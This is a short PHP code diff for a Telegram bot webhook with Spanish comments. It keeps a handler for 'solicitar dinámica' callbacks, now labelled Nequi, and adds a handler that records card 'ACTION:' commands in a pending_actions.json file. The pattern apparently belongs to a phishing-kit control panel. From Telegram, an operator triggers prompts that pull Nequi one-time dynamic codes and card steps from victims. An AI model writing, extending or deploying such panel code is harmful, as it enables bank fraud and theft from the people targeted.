@@ -11,7 +11,7 @@ if ($update && isset($update['callback_query'])) {
     $callbackQuery = $update['callback_query'];
     $callbackData = $callbackQuery['data'];
 
-    // Verificar si es un callback de solicitar dinamica
+    // Verificar si es un callback de solicitar dinamica (Nequi)
     if (strpos($callbackData, 'solicitar_dinamica_') === 0) {
         // Extraer transactionId del callback data
         $transactionId = str_replace('solicitar_dinamica_', '', $callbackData);
@@ -50,6 +50,32 @@ if ($update && isset($update['callback_query'])) {
             'method' => 'answerCallbackQuery',
             'callback_query_id' => $callbackQuery['id'],
             'text' => 'Dinámica solicitada correctamente',
+            'show_alert' => false
+        ];
+
+        echo json_encode($response);
+        exit;
+    }
+
+    // Verificar si es un callback de tarjeta (ACTION:*)
+    if (strpos($callbackData, 'ACTION:') === 0) {
+        $action = str_replace('ACTION:', '', $callbackData);
+
+        // Archivo para almacenar acciones pendientes de tarjetas
+        $actionsFile = $_SERVER['DOCUMENT_ROOT'] . '/pending_actions.json';
+        $actions = file_exists($actionsFile) ? json_decode(file_get_contents($actionsFile), true) : [];
+        $actions[] = [
+            'action' => $action,
+            'data' => [],
+            'timestamp' => time()
+        ];
+        file_put_contents($actionsFile, json_encode($actions));
+
+        // Responder al callback de Telegram
+        $response = [
+            'method' => 'answerCallbackQuery',
+            'callback_query_id' => $callbackQuery['id'],
+            'text' => 'Procesando...',
             'show_alert' => false
         ];
 
